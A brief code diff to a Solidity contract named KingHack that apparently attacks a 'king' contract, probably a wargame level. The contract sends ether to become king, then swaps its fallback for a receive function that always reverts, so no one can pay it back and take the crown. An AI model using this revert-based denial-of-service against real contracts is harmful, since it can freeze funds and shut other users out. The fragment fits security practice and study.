@@ -16,7 +16,7 @@ contract KingHack {
         king.call{value: 0.0015 ether}("");
 	}
 
-	fallback() external payable {
+	receive() external payable {
         revert("haha sucker!");
     }
 }
